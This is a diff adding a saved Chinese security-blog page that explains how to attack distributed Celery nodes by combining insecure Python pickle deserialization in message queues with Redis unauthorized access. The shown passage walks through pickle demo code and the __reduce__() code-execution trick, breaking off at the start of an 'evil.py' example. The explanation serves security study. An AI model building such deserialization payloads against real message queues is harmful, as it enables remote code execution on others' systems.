@@ -1,0 +1,937 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8" />	
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0">
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+<title>漏洞组合拳 &#8211; 攻击分布式节点 - SecPulse.COM | 安全脉搏</title>
+<meta name="description" content="分布式系统大都需要依赖于消息队列中间件来解决异步处理、应用耦合等问题，消息队列中间件的选择又依赖于整体系统的设计和实现，消息的封装、传递、处理贯穿了整个系统，如果在某一个关键处理逻辑点上出现了安全问题，那么整个分布式节点都有可能受到破坏。" />
+<meta name="keywords" content="ActiveMQ,Celery 分布式框架,Django 远程命令执行漏洞详解,kafka,Python序列化的安全,RabbitMQ,redis,RickGray,分布式系统,攻击分布式节点,未授权访问,消息队列中间件,漏洞组合拳" />
+
+<link rel='stylesheet' id='style-css'  href='https://www.secpulse.com/wp-content/themes/sec/style.css?ver=2014.9.21' type='text/css' media='all' />
+<link rel='stylesheet' id='jquery.fancybox-css'  href='https://www.secpulse.com/wp-content/themes/sec/css/jquery.fancybox.css?ver=1.0' type='text/css' media='all' />
+<link rel='stylesheet' id='font-awesome-css'  href='https://www.secpulse.com/wp-content/themes/sec/css/font-awesome.min.css?ver=1.0' type='text/css' media='all' />
+<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.min.js?ver=2.15'></script>
+<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.fancybox.js?ver=2.15'></script>
+<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/helpers/jquery.fancybox-buttons.js?ver=2.15'></script>
+<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.mousewheel-3.0.6.pack.js?ver=1.0'></script>
+<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/owl.carousel.min.js?ver=1.0'></script>
+<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/custom.js?ver=1.0'></script>
+<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/comments-ajax.js?ver=1.3'></script>
+<link rel='canonical' href='https://www.secpulse.com/archives/52116.html' />
+<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+<!--[if lt IE 9]>
+<script src="http://cdn.bootcss.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+<script src="http://cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
+<![endif]-->
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?7f4cc5524dcb1aec487b4266c18bae48";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+</head>
+<body class="single single-post postid-52116 single-format-standard">
+	<header id="header" class="header clr">
+		<div class="header-top inner clr">
+	<hgroup class="logo-main"><h1 class="logo"><a href="https://www.secpulse.com/" rel="home" title="安全脉搏">安全脉搏</a></h1><h4 class="xs-hidden">分享技术，悦享品质 
+	</h4>
+	</hgroup>
+
+<div class="login xs-hidden">
+				<div class="logindiv">
+					<div class="img">
+<img src="https://www.secpulse.com/wp-content/uploads/2017/05/rabbit.jpeg" width="36" height="36" alt="" class="avatar avatar-36 wp-user-avatar wp-user-avatar-36 photo avatar-default" /></div><span href="javascript:void(0);" title="用户" class="yh">用户</span><i
+						class="fa fa-caret-down fa-2"></i>
+					<ul class="login-links">
+						<li class="log"><a
+							href="https://www.secpulse.com/wp-login.php"
+							target="_blank"><i class="fa fa-arrow-right"></i><span>登陆</span></a></li>
+						<li class="exit"><a
+							href="https://www.secpulse.com/wp-login.php?action=register"><i
+								class="fa fa-user-times"></i><span>注册</span></a></li>
+					</ul>
+	
+  </div>
+			</div>
+			<div class="top-search xs-hidden">
+  <form id="search" method="get" action="https://www.secpulse.com" >
+	<input type="text" name="s" id="s" autocomplete="off"  placeholder="输入搜索内容">
+	<button class="btn-search"> <i class="fa fa-search"></i></button>
+</form></div>
+			<div class="menu-button">
+				<i class="fa fa-bars fa-3x"></i>
+			</div>
+		</div>
+
+
+		<div class="main-nav  xs-hidden">
+			<div class="inner clr"><nav class="left-nav clr"><ul id="menu-%e5%af%bc%e8%88%aa" class="header-menu-nav"><li id="menu-item-15" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-15"><a href="https://www.secpulse.com/">首页</a></li>
+<li id="menu-item-17" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-has-children menu-item-17"><a href="https://www.secpulse.com/archives/category/articles">文章</a>
+<ul class="sub-menu">
+	<li id="menu-item-34048" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34048"><a href="https://www.secpulse.com/archives/category/articles/intranet-penetration">内网渗透</a></li>
+	<li id="menu-item-34047" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34047"><a href="https://www.secpulse.com/archives/category/articles/code-audit">代码审计</a></li>
+	<li id="menu-item-34046" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34046"><a href="https://www.secpulse.com/archives/category/articles/web">Web安全</a></li>
+	<li id="menu-item-34565" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-34565"><a href="https://www.secpulse.com/archives/category/articles/sec-doc">安全文献</a></li>
+	<li id="menu-item-34568" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34568"><a href="https://www.secpulse.com/archives/category/articles/social-engineering">社会工程</a></li>
+	<li id="menu-item-35948" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35948"><a href="https://www.secpulse.com/archives/category/articles/wireless">无线安全</a></li>
+	<li id="menu-item-35949" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35949"><a href="https://www.secpulse.com/archives/category/articles/mobile-security">移动安全</a></li>
+	<li id="menu-item-35950" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-35950"><a href="https://www.secpulse.com/archives/category/articles/system">系统安全</a>
+	<ul class="sub-menu">
+		<li id="menu-item-35951" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35951"><a href="https://www.secpulse.com/archives/category/articles/system/linux">Linux</a></li>
+		<li id="menu-item-35952" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35952"><a href="https://www.secpulse.com/archives/category/articles/system/windows">Windows</a></li>
+	</ul>
+</li>
+	<li id="menu-item-35953" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35953"><a href="https://www.secpulse.com/archives/category/articles/reverse-break">逆向破解</a></li>
+</ul>
+</li>
+<li id="menu-item-18" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-18"><a href="https://www.secpulse.com/archives/category/news">资讯</a>
+<ul class="sub-menu">
+	<li id="menu-item-35956" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35956"><a href="https://www.secpulse.com/archives/category/news/china-news">国内资讯</a></li>
+	<li id="menu-item-35957" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35957"><a href="https://www.secpulse.com/archives/category/news/world-news">国外资讯</a></li>
+</ul>
+</li>
+<li id="menu-item-379" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-379"><a href="https://www.secpulse.com/archives/category/construction">安全建设</a>
+<ul class="sub-menu">
+	<li id="menu-item-51480" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51480"><a href="https://www.secpulse.com/archives/category/construction/securityissue">安全管理</a></li>
+	<li id="menu-item-54332" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54332"><a href="https://www.secpulse.com/archives/category/construction/%e4%b8%9a%e5%8a%a1%e5%ae%89%e5%85%a8">业务安全</a></li>
+	<li id="menu-item-35955" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35955"><a href="https://www.secpulse.com/archives/category/construction/bigdata">数据分析</a></li>
+	<li id="menu-item-54333" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54333"><a href="https://www.secpulse.com/archives/category/construction/security-reports">安全报告</a></li>
+</ul>
+</li>
+<li id="menu-item-368" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-368"><a href="https://www.secpulse.com/archives/category/exclusive">独家</a>
+<ul class="sub-menu">
+	<li id="menu-item-35947" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35947"><a href="https://www.secpulse.com/archives/category/articles/industrial-safety">工控安全</a></li>
+	<li id="menu-item-35954" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35954"><a href="https://www.secpulse.com/archives/category/exclusive/ctf-writeup">CTF</a></li>
+	<li id="menu-item-50217" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-50217"><a href="https://www.secpulse.com/archives/category/exclusive/duoyinsu">多因素令牌</a></li>
+	<li id="menu-item-51479" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51479"><a href="https://www.secpulse.com/archives/category/exclusive/dataleakage">数据泄露</a></li>
+</ul>
+</li>
+<li id="menu-item-16" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-16"><a href="https://www.secpulse.com/archives/category/tools">工具</a></li>
+<li id="menu-item-52" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-52"><a href="https://www.secpulse.com/archives/category/hiring">招聘</a></li>
+<li id="menu-item-50" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-50"><a href="https://www.secpulse.com/newsend">投稿</a></li>
+<li id="menu-item-6645" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-6645"><a href="https://www.secpulse.com/archives/category/vul">漏洞</a></li>
+</ul></nav>  <nav class="right-nav clr "><ul id="menu-%e5%af%bc%e8%88%aa%e4%ba%8c" class="header-menu-nav"><li id="menu-item-33967" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33967"><a title="付费渗透测试" href="http://service.secpulse.com">安全服务</a></li>
+<li id="menu-item-52043" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-52043"><a title="安全从业者最实用的安全导航" href="http://nav.secpulse.com">安全导航</a></li>
+<li id="menu-item-33966" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33966"><a title="安识科技" href="https://www.duoyinsu.com">多因素</a></li>
+</ul></nav></div>
+		</div>
+		<div class="nav-bg"></div>
+   <nav class="mini-nav visible-xs"><ul id="menu-%e5%af%bc%e8%88%aa-1" class="menu-mini-nav"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-15"><a href="https://www.secpulse.com/">首页</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-has-children menu-item-17"><a href="https://www.secpulse.com/archives/category/articles">文章</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34048"><a href="https://www.secpulse.com/archives/category/articles/intranet-penetration">内网渗透</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34047"><a href="https://www.secpulse.com/archives/category/articles/code-audit">代码审计</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34046"><a href="https://www.secpulse.com/archives/category/articles/web">Web安全</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-34565"><a href="https://www.secpulse.com/archives/category/articles/sec-doc">安全文献</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34568"><a href="https://www.secpulse.com/archives/category/articles/social-engineering">社会工程</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35948"><a href="https://www.secpulse.com/archives/category/articles/wireless">无线安全</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35949"><a href="https://www.secpulse.com/archives/category/articles/mobile-security">移动安全</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-35950"><a href="https://www.secpulse.com/archives/category/articles/system">系统安全</a>
+	<ul class="sub-menu">
+		<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35951"><a href="https://www.secpulse.com/archives/category/articles/system/linux">Linux</a></li>
+		<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35952"><a href="https://www.secpulse.com/archives/category/articles/system/windows">Windows</a></li>
+	</ul>
+</li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35953"><a href="https://www.secpulse.com/archives/category/articles/reverse-break">逆向破解</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-18"><a href="https://www.secpulse.com/archives/category/news">资讯</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35956"><a href="https://www.secpulse.com/archives/category/news/china-news">国内资讯</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35957"><a href="https://www.secpulse.com/archives/category/news/world-news">国外资讯</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-379"><a href="https://www.secpulse.com/archives/category/construction">安全建设</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51480"><a href="https://www.secpulse.com/archives/category/construction/securityissue">安全管理</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54332"><a href="https://www.secpulse.com/archives/category/construction/%e4%b8%9a%e5%8a%a1%e5%ae%89%e5%85%a8">业务安全</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35955"><a href="https://www.secpulse.com/archives/category/construction/bigdata">数据分析</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54333"><a href="https://www.secpulse.com/archives/category/construction/security-reports">安全报告</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-368"><a href="https://www.secpulse.com/archives/category/exclusive">独家</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35947"><a href="https://www.secpulse.com/archives/category/articles/industrial-safety">工控安全</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35954"><a href="https://www.secpulse.com/archives/category/exclusive/ctf-writeup">CTF</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-50217"><a href="https://www.secpulse.com/archives/category/exclusive/duoyinsu">多因素令牌</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51479"><a href="https://www.secpulse.com/archives/category/exclusive/dataleakage">数据泄露</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-16"><a href="https://www.secpulse.com/archives/category/tools">工具</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-52"><a href="https://www.secpulse.com/archives/category/hiring">招聘</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-50"><a href="https://www.secpulse.com/newsend">投稿</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-6645"><a href="https://www.secpulse.com/archives/category/vul">漏洞</a></li>
+</ul></nav>     </header><section class="xs-main index-main clr">
+<div class="inner">
+<div class="xs-left">
+<nav class="crumbs">现在位置： <a title="返回首页" href="https://www.secpulse.com">首页</a> &gt; <a href="https://www.secpulse.com/archives/category/articles">文章</a> &gt; <a href="https://www.secpulse.com/archives/category/articles/sec-doc" rel="category tag">安全文献</a> &gt;  正文 </nav><article id="post-52116" class="post-52116 post type-post status-publish format-standard has-post-thumbnail hentry category-sec-doc tag-activemq tag-celery- tag-django- tag-kafka tag-python tag-rabbitmq tag-redis tag-rickgray tag-62774 tag-62773 tag-2912 tag-62775 tag-62772">
+	<header class="single-header">
+		<h1>漏洞组合拳 &#8211; 攻击分布式节点</h1>
+			<div class="single-meta">
+				
+		    <div class="time"><i></i> <a href="javascript:void(0);">2016 /9/28 10:00</a></div>
+			<div class="eye xs-hidden"><i class="fa fa-eye fa-1"></i><a href="javascript:void(0);">5,393</a> </div>			<div class="comments xs-hidden"><i class="fa fa-comments fa-1"></i><a href="https://www.secpulse.com/archives/52116.html#comments">评论 1 条</a></div>
+			
+			
+		</div>
+		<!-- .entry-meta -->
+	</header>
+	<!-- .single-header -->
+
+	<div class="single-main">
+		<div class="lp-post-content">
+<p>分布式系统大都需要依赖于<strong>消息队列中间件</strong>来解决异步处理、应用耦合等问题，<strong>消息队列中间件</strong>的选择又依赖于整体系统的设计和实现，消息的<strong>封装</strong>、<strong>传递</strong>、<strong>处理</strong>贯穿了整个系统，如果在某一个关键处理逻辑点上出现了安全问题，那么整个分布式节点都有可能受到破坏。</p>
+<p>流行的开发语言几乎都存在序列化处理不当导致的命令执行问题，如 Python 里类的魔术方法 <code class="highlighter-rouge">__reduce__()</code> 会在 pickle 库进行反序列化的时候进行调用，PHP 中类的魔术方法 <code class="highlighter-rouge">__wakup()</code> 同样也会在实例进行反序列化的时候调用等等。</p>
+<p>从开发者角度看来，开发语言提供的数据序列化方式方便了实例对象进行跨应用传递，<strong>程序A</strong> 和 <strong>程序B</strong> 能够通过序列化数据传递方式来<strong>远程访问实例对象</strong>或者<strong>远程调用方法</strong>（如 Java 中的 RMI）；而站在安全研究者角度，这种跨应用的数据传递或者调用方式可能存在对象数据篡改和方法恶意调用的安全隐患。</p>
+<p>在消息队列的实现中，消息数据的序列化（封装）方式就成了一颗定时炸弹，不安全的序列化方式可能会导致消息数据被篡改，从而引发反序列化（数据解析）后的一些列安全问题。</p>
+<p><span style="color: #008000;">消息队列中间件的选择也是一大问题，常见的有 RabbitMQ，ActiveMQ，Kafka，<a href="https://www.secpulse.com/archives/5357.html" target="_blank">Redis</a> 等，而像 <a href="https://www.secpulse.com/archives/40406.html" target="_blank">Redis </a>这种存在未授权访问问题的组件如果被攻击者所控制，即可通过组件直接向消息队列中插入数据，轻则影响整个分布式节点的逻辑处理，重则直接插入恶意数据结合反序列化等问题对节点群进行攻击。</span></p>
+<p>说了这么多，总结一下上面提到的几个安全问题：</p>
+<ol>
+<li>各语言中存在的序列化问题可直接导致远程命令执行；</li>
+<li>消息队列的实现常常会直接使用语言自身的序列化（或相似的）方式封装消息；</li>
+<li>分布式系统使用的消息队列中间件种类繁多，其中某些分布式框架使用了像 Redis 这种存在着<span style="color: #ff6600;"><strong>未授权访问</strong></span>问题的组件；</li>
+<li>消息队列中消息的篡改会直接或间接影响到分布式节点；</li>
+</ol>
+<p>将这 4 个安全问题或者说是漏洞结合在一起，即可成为一种可直接入侵和破坏分布式节点的攻击方法。那么，是否存在真正满足上述问题的实例呢？目前，已经发现了 Python 中 Celery 分布式框架确实存在这样的问题，下面我会针对上诉 4 个问题以 Celery 分布式框架为例来说明如何攻击分布式节点打出漏洞组合拳。</p>
+<h2 id="python-">一、老生常谈 Python 序列化</h2>
+<p>Celery 分布式框架是由 Python 语言所编写的，为了下面更好的说明问题，所以这里首先简单的回顾一下 Python 序列化的安全问题。</p>
+<h4 id="section"><span style="color: #ff6600;">1. 简单的序列化例子</span></h4>
+<p>Python 中有这么一个名为 <code class="highlighter-rouge">pickle</code> 的模块用于实例对象的序列化和反序列化，一个简单的例子：</p>
+<div class="language-python highlighter-rouge">
+<pre class="highlight"><code class="hljs python"><span class="kn"><span class="hljs-keyword">import</span></span> <span class="nn">base64</span>
+<span class="kn"><span class="hljs-keyword">import</span></span> <span class="nn">pickle</span>
+
+<span class="k"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span> <span class="nc"><span class="hljs-class"><span class="hljs-title">MyObj</span></span></span><span class="p"><span class="hljs-class"><span class="hljs-params">(</span></span></span><span class="nb"><span class="hljs-class"><span class="hljs-params">object</span></span></span><span class="p"><span class="hljs-class"><span class="hljs-params">)</span>:</span></span>
+    <span class="n">loa</span> <span class="o">=</span> <span class="s"><span class="hljs-string">'hello my object'</span></span>
+    
+<span class="n">t_obj</span> <span class="o">=</span> <span class="n">MyObj</span><span class="p">()</span>
+<span class="n">serialized</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">t_obj</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="s"><span class="hljs-string">'--&gt; pickling MyObj instance {} and Base64 it</span></span><span class="se"><span class="hljs-string">\n</span></span><span class="s"><span class="hljs-string">got "{}"'</span></span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">t_obj</span><span class="p">,</span> <span class="n">serialized</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="s"><span class="hljs-string">'--&gt; unpickling serialized data</span></span><span class="se"><span class="hljs-string">\n</span></span><span class="s"><span class="hljs-string">with "{}"'</span></span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">serialized</span><span class="p">))</span>
+<span class="n">obj</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">serialized</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="s"><span class="hljs-string">'** unpickled object is {}'</span></span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">obj</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="s"><span class="hljs-string">'{} -&gt; loa = {}'</span></span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="n">obj</span><span class="o">.</span><span class="n">loa</span><span class="p">))</span>
+</code></pre>
+</div>
+<p>因 <code class="highlighter-rouge">pickle</code> 模块对实例对象进行序列化时产生的是二进制结构数据，传输的时候常常会将其进行 Base64 编码，这样可以有效地防止字节数据丢失。上面的程序作用是将一个 <code class="highlighter-rouge">MyObj</code> 类实例进行序列化并进行 Base64 编码然后进行解码反序列化重新得到实例的一个过程，运行程序后得到输出：</p>
+<p><a href="http://www.secpulse.com/wp-content/uploads/2016/09/pickle1.png"><img class="alignnone size-large wp-image-52161" src="http://www.secpulse.com/wp-content/uploads/2016/09/pickle1-1024x146.png" alt="pickle1" width="1024" height="146" /></a></p>
+<p>通过截图可以看到序列化前和序列化后的实例是不同的（对象地址不同），并且通常反序列化时实例化一个类实例，当前的运行环境首先必须定义了该类型才能正常序列化，否则可能会遇到找不到正确类型无法进行反序列化的情况，例如将上诉过程分文两个文件 <code class="highlighter-rouge">serializer.py</code> 和 <code class="highlighter-rouge">unserializer.py</code>，前一个文件用于实例化 <code class="highlighter-rouge">MyObj</code> 类并将其序列化然后经 Base64 编码输出，而后一个文件用于接收一串字符串，将其 Base64 解码后进行反序列化：</p>
+<div class="language-python highlighter-rouge">
+<pre class="highlight"><code class="hljs python"><span class="c"><span class="hljs-comment"># serializer.py</span></span>
+<span class="kn"><span class="hljs-keyword">import</span></span> <span class="nn">base64</span>
+<span class="kn"><span class="hljs-keyword">import</span></span> <span class="nn">pickle</span>
+<span class="k"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span> <span class="nc"><span class="hljs-class"><span class="hljs-title">MyObj</span></span></span><span class="p"><span class="hljs-class"><span class="hljs-params">(</span></span></span><span class="nb"><span class="hljs-class"><span class="hljs-params">object</span></span></span><span class="p"><span class="hljs-class"><span class="hljs-params">)</span>:</span></span>
+    <span class="n">loa</span> <span class="o">=</span> <span class="s"><span class="hljs-string">'hello my object'</span></span>
+<span class="k">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">MyObj</span><span class="p">())))</span>
+</code></pre>
+</div>
+<div class="language-python highlighter-rouge">
+<pre class="highlight"><code class="hljs css"><span class="c"># <span class="hljs-tag">unserializer</span><span class="hljs-class">.py</span></span>
+<span class="kn"><span class="hljs-tag">import</span></span> <span class="nn"><span class="hljs-tag">sys</span></span>
+<span class="kn"><span class="hljs-tag">import</span></span> <span class="nn"><span class="hljs-tag">base64</span></span>
+<span class="kn"><span class="hljs-tag">import</span></span> <span class="nn"><span class="hljs-tag">pickle</span></span>
+<span class="k"><span class="hljs-tag">print</span></span><span class="p">(</span><span class="n"><span class="hljs-tag">pickle</span></span><span class="o"><span class="hljs-class">.</span></span><span class="n"><span class="hljs-class">loads</span></span><span class="p">(</span><span class="n"><span class="hljs-tag">base64</span></span><span class="o"><span class="hljs-class">.</span></span><span class="n"><span class="hljs-class">b64decode</span></span><span class="p">(</span><span class="n"><span class="hljs-tag">sys</span></span><span class="o"><span class="hljs-class">.</span></span><span class="n"><span class="hljs-class">argv</span></span><span class="p"><span class="hljs-attr_selector">[</span></span><span class="mi"><span class="hljs-attr_selector">1</span></span><span class="p"><span class="hljs-attr_selector">]</span>)))</span>
+</code></pre>
+</div>
+<p>就上面所说，在反序列化时如果环境中不存在反序列化类型的定义，因为 <code class="highlighter-rouge">unserializer.py</code> 中未定义 <code class="highlighter-rouge">MyObj</code> 类，则在对 <code class="highlighter-rouge">serializer.py</code> 输出结果进行反序列化时会失败报错，提示找不到 <code class="highlighter-rouge">MyObj</code>：</p>
+<p><a href="http://www.secpulse.com/wp-content/uploads/2016/09/pickle2.png"><img class="alignnone size-large wp-image-52162" src="http://www.secpulse.com/wp-content/uploads/2016/09/pickle2-1024x373.png" alt="pickle2" width="1024" height="373" /></a></p>
+<h4 id="trick-"><span style="color: #ff6600;">2. Trick 使得反序列化变得危险</span></h4>
+<p>看似反序列化并不能实例化任意对象（运行环境依赖），但有那么些 tricks 可以达到进行反序列化即可任意代码执行的效果。</p>
+<p>如果一个类定义了 <code class="highlighter-rouge">__reduce__()</code> 函数，那么在对其实例进行反序列化的时候，<code class="highlighter-rouge">pickle</code> 会通过 <code class="highlighter-rouge">__reduce__()</code> 函数去寻找正确的重新类实例化过程。（<code class="highlighter-rouge">__reduce__()</code> 函数<a href="https://docs.python.org/2/library/pickle.html#object.__reduce__">详细文档参考</a>）</p>
+<p>例如这里我在 <code class="highlighter-rouge">MyObj</code> 类中定义 <code class="highlighter-rouge">__reduce__()</code> 函数：</p>
+<div class="language-python highlighter-rouge">
+<pre class="highlight"><code class="hljs python"><span class="o">...</span>
+<span class="k"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span> <span class="nc"><span class="hljs-class"><span class="hljs-title">MyObj</span></span></span><span class="p"><span class="hljs-class"><span class="hljs-params">(</span></span></span><span class="nb"><span class="hljs-class"><span class="hljs-params">object</span></span></span><span class="p"><span class="hljs-class"><span class="hljs-params">)</span>:</span></span>
+    <span class="n">loa</span> <span class="o">=</span> <span class="s"><span class="hljs-string">'hello my object'</span></span>
+    <span class="k"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span> <span class="nf"><span class="hljs-function"><span class="hljs-title">__reduce__</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">(</span></span></span><span class="bp"><span class="hljs-function"><span class="hljs-params">self</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">)</span>:</span></span>
+        <span class="k"><span class="hljs-keyword">return</span></span> <span class="p">(</span><span class="nb">str</span><span class="p">,</span> <span class="p">(</span><span class="s"><span class="hljs-string">'replaced by __reduce__() method'</span></span><span class="p">,</span> <span class="p">))</span>
+<span class="o">...</span>
+</code></pre>
+</div>
+<p>然后再执行上一节的程序过程，会直接得到输出：</p>
+<p><a href="http://www.secpulse.com/wp-content/uploads/2016/09/pickle3.png"><img class="alignnone size-large wp-image-52163" src="http://www.secpulse.com/wp-content/uploads/2016/09/pickle3-1024x113.png" alt="pickle3" width="1024" height="113" /></a></p>
+<p>这里不再报错是因为，<code class="highlighter-rouge">MyObj</code> 在进行序列化的时候，将重新构建类的过程写进了序列化数据里，<code class="highlighter-rouge">pickle</code> 在进行反序列化的时候会遵循重建过程去执行相应操作，这里是使用内置的 <code class="highlighter-rouge">str</code> 函数去操作参数 <code class="highlighter-rouge">'replaced by __reduce__() method'</code> 并返回，所以成功反序列化并输出的字符串。</p>
+<p>有了 <code class="highlighter-rouge">__reduce__()</code> 这个函数，就可以利用该特性在反序列化的时候直接执行任意代码了，如下示例代码：</p>
+<div class="language-python highlighter-rouge">
+<pre class="highlight"><code class="hljs python"><span class="c"><span class="hljs-comment"># evil.py</span></span>
+<span class="kn"><span class="hljs-keyword">import</span></span> <span class="nn">os</span>
+<span class="kn"><span class="hljs-keyword">import</span></span> <span class="nn">base64</span>
+<span class="kn"><span class="hljs-keyword">import</span></span> <span class="nn">pickle</span>
+<span class="k"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span> <span class="nc"><span class="hljs-class"><span class="hljs-title">CMD</span></span></span><span class="p"><span class="hljs-class"><span class="hljs-params">(</span></span></span><span class="nb"><span class="hljs-class"><span class="hljs-params">object</span></span></span><span class="p"><span class="hljs-class"><span class="hljs-params">)</span>:</span></span>
+    <span class="k"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span> <span class="nf"><span class="hljs-function"><span class="hljs-title">__reduce__</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">(</span></span></span><span class="bp"><span class="hljs-function"><span class="hljs-params">self</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">)</span>:</span></span>
